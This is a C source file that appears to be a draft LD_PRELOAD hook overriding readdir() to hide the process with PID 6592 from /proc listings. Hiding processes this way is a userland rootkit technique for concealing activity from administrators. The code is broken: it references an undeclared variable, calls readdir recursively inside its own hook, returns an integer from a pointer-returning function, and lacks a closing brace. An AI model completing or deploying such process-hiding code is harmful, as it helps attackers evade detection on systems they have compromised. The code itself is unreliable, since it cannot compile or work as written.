#include <error.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

#define __USE_GNU
#include <dlfcn.h>

static struct dirent *(*orig_readdir) (DIR *) = NULL;

struct dirent *readdir (DIR * dirp){
   if (orig_readdir == NULL){
      orig_readdir = dlsym (RTLD_NEXT, "readdir");
      if (orig_readdir == NULL)
         error (1, errno, "dlsym");
      fprintf(stderr, "Catched\n");
   }

     DIR *directory;
     DIR *subdirectory;
     static const char* hide_process = "6592";
     // will store pointer to each entry in the directory
     struct dirent *entry;
     
     // attempt to open the current working directory, opendir() returns NULL 
     // on failure
     directory = opendir("/proc");
     
     // if opening the directory fails, exit with an error message and status
     if (directory == NULL)
     {
       printf("Error opening directory.\n");
       return 1;
     }
     
     // Read each entry in the directory with readdir() and store the pointer to 
     // the struct dirent into entry... when there are no more entries in the 
     // directory readdir() will return NULL and terminate the loop at that point.
     while ((entry = readdir(directory)) != NULL)
     {
       // if the entry is a directory, output the directory name 
       // prepended with "dir: " again so we know what what it is when looking 
       // at the program output.
       if (entry->d_type == DT_DIR) {
         if ( strcmp(entry->d_name, hide_process) == 0){
              printf("Found PID: %s  with name: %s\n", entry->d_name, subentry->d_name);
          }
          else {
             return (orig_readdir (dirp));
          }
     }
     
     // close the directory... if closedir() fails it will return -1
     if (closedir(directory) == -1)
     {
       // exit with an error message and status if closedir() fails
       printf("Error closing directory.\n");
       return 1;
     }
}
